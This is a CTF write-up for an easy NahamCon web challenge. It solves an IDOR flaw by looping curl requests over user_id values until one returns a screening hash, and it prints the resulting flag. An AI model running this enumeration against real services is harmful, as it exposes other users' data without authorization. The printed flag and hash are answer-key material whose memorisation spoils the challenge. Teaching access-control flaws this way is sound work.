**Category:** Web Exploitation (IDOR)  
**Difficulty:** Easy  
**Challenge URL:** `http://challenge.nahamcon.com:30723`  
**Flag:** `flag{f0b1d2a98cd92d728ddd76067f959c31}`

---

### 🧠 Objective

We were tasked with retrieving a movie screening token by abusing insecure authorization mechanisms. The challenge tested our understanding of broken access control, specifically **Insecure Direct Object Reference (IDOR)**.

---

### 🔍 Initial Observation

On visiting the website, we observed a client-side call to the following endpoint:

```bash
POST /api/screen-token/
Content-Type: application/json
Payload: { "user_id": 1 }
```

This endpoint responded with error messages like:

```bash
{
  "error": "Account deactivated"
}
```

This suggested the endpoint was checking for a `user_id`, and different IDs triggered different responses — a potential IDOR situation.


### 🛠️ Exploitation – Fuzzing for a Valid `user_id`

We wrote a simple bash loop to enumerate possible user IDs:


```bash
for id in {1..20}; do
  echo "Trying user_id: $id"
  curl -s -X POST http://challenge.nahamcon.com:30723/api/screen-token/ \
    -H "Content-Type: application/json" \
    -d "{\"user_id\":$id}" | jq
done
```

![[Pasted image 20250525230453.png]]

💡 Breakthrough at user_id 7:

```bash
{
  "hash": "fe49e2554d481e070c213ec0b8a9113e"
}
```

This was **not an error message**, but a valid screening hash!

### 🎯 Final Step – Accessing the Flag

We visited the link:

```bash
http://challenge.nahamcon.com:30723/screen/?key=fe49e2554d481e070c213ec0b8a9113e
```

And then we get the flag:

![[Pasted image 20250525230659.png]]

```bash
flag{f0b1d2a98cd92d728ddd76067f959c31}
```


### 🧵 Root Cause

The `/api/screen-token/` endpoint exposed user-specific resources without proper authentication or authorization. Anyone could supply `user_id: 7` and retrieve sensitive data.

> This is a textbook case of **Insecure Direct Object Reference (IDOR)**.